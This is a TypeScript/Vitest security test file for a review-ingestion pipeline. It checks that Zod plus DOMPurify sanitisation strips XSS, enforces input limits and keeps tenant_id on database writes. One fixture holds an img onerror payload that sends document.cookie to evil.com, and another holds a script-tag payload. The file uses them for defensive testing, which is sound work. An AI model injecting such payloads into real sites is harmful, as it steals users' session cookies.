/**
 * @file ingest.security.test.ts
 * @description Testes de segurança para o pipeline de ingestão de reviews.
 * Refs: C9 (Zod + DOMPurify), C2 (tenant_id obrigatório), OWASP A03
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'

// ── Mock do cliente Supabase Admin ─────────────────────────────────────────
vi.mock('../src/lib/supabase.js', () => ({
  supabaseAdmin: {
    from: vi.fn().mockReturnThis(),
    upsert: vi.fn().mockResolvedValue({ data: [], error: null }),
    select: vi.fn().mockReturnThis(),
    eq:     vi.fn().mockReturnThis(),
    single: vi.fn().mockResolvedValue({ data: { id: 'tenant-abc' }, error: null }),
  },
}))

const validReview = {
  external_review_id: '550e8400-e29b-41d4-a716-446655440000',
  reviewer_name:      'Maria Silva',
  rating:             5,
  content:            'Ótimo atendimento, recomendo!',
  source_platform:    'google' as const,
  reviewed_at:        '2024-01-15T10:30:00.000Z',
}

describe('[C9] Ingestão — Sanitização XSS com DOMPurify + Zod', () => {

  // [APPSEC C9-A] Payload com script tag deve ter HTML removido
  it('deve remover tags <script> do conteúdo do review', async () => {
    const xssPayload = {
      ...validReview,
      content: '<script>alert("xss")</script>Bom serviço',
    }
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(xssPayload)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.content).not.toContain('<script>')
      expect(result.data.content).not.toContain('alert(')
    }
  })

  // [APPSEC C9-B] Payload com img onerror (DOM-based XSS)
  it('deve remover atributos onerror de tags img', async () => {
    const xssPayload = {
      ...validReview,
      content: '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
    }
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(xssPayload)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.content).not.toContain('onerror')
      expect(result.data.content).not.toContain('evil.com')
    }
  })

  // [APPSEC C9-C] Conteúdo excedendo limite máximo (10.000 chars) deve falhar
  it('deve rejeitar conteúdo com mais de 10.000 caracteres', async () => {
    const oversizedPayload = {
      ...validReview,
      content: 'A'.repeat(10_001),
    }
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(oversizedPayload)
    expect(result.success).toBe(false)
    expect(result.error?.issues[0].code).toBe('too_big')
  })

  // [APPSEC C9-D] Rating fora do range [1-5] deve ser rejeitado
  it('deve rejeitar rating = 0 (abaixo do mínimo)', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({ ...validReview, rating: 0 })
    expect(result.success).toBe(false)
  })

  it('deve rejeitar rating = 6 (acima do máximo)', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({ ...validReview, rating: 6 })
    expect(result.success).toBe(false)
  })

  // [APPSEC C9-E] source_platform inválido deve ser rejeitado
  it('deve rejeitar source_platform desconhecido', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({
      ...validReview,
      source_platform: 'malicious_platform',
    })
    expect(result.success).toBe(false)
  })

  // [APPSEC C9-F] Payload completamente válido deve ser aceito
  it('deve aceitar payload válido sem modificação indevida', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse(validReview)
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.reviewer_name).toBe('Maria Silva')
      expect(result.data.rating).toBe(5)
    }
  })

  // [APPSEC C2] tenant_id deve estar presente em todos os rows do upsert
  it('deve incluir tenant_id em cada row enviado ao banco', async () => {
    const { supabaseAdmin } = await import('../src/lib/supabase.js')
    const { processBatch } = await import('../src/lib/ingest.js') as any

    const upsertSpy = vi.spyOn(supabaseAdmin.from('reviews' as any), 'upsert')

    await processBatch([{ ...validReview, tenant_id: 'tenant-abc' }] as any)

    expect(upsertSpy).toHaveBeenCalled()
    const calledWith = upsertSpy.mock.calls[0][0]
    const rows = Array.isArray(calledWith) ? calledWith : [calledWith]
    rows.forEach(row => {
      expect(row).toHaveProperty('tenant_id', 'tenant-abc')
    })
  })

  // [APPSEC C9-G] UPSERT deve usar onConflict correto para deduplicação
  it('deve chamar upsert com onConflict incluindo tenant_id', async () => {
    const { supabaseAdmin } = await import('../src/lib/supabase.js')
    const { processBatch } = await import('../src/lib/ingest.js') as any

    const fromSpy = vi.spyOn(supabaseAdmin, 'from').mockReturnValue({
      upsert: vi.fn().mockResolvedValue({ data: [], error: null }),
    } as any)

    await processBatch([{ ...validReview, tenant_id: 'tenant-abc' }] as any)

    const upsertCall = (fromSpy.mock.results[0].value as any).upsert
    expect(upsertCall).toHaveBeenCalledWith(
      expect.any(Array),
      expect.objectContaining({
        onConflict: expect.stringContaining('tenant_id'),
      })
    )
  })
})

describe('[C9] Ingestão — Reviewer name trimming', () => {
  it('deve remover espaços em branco do reviewer_name', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({
      ...validReview,
      reviewer_name: '   João   ',
    })
    expect(result.success).toBe(true)
    if (result.success) {
      expect(result.data.reviewer_name).toBe('João')
    }
  })

  it('deve rejeitar reviewer_name com mais de 100 caracteres', async () => {
    const { RawReviewSchema } = await import('../src/lib/ingest.js') as any
    const result = RawReviewSchema.safeParse({
      ...validReview,
      reviewer_name: 'N'.repeat(101),
    })
    expect(result.success).toBe(false)
  })
})
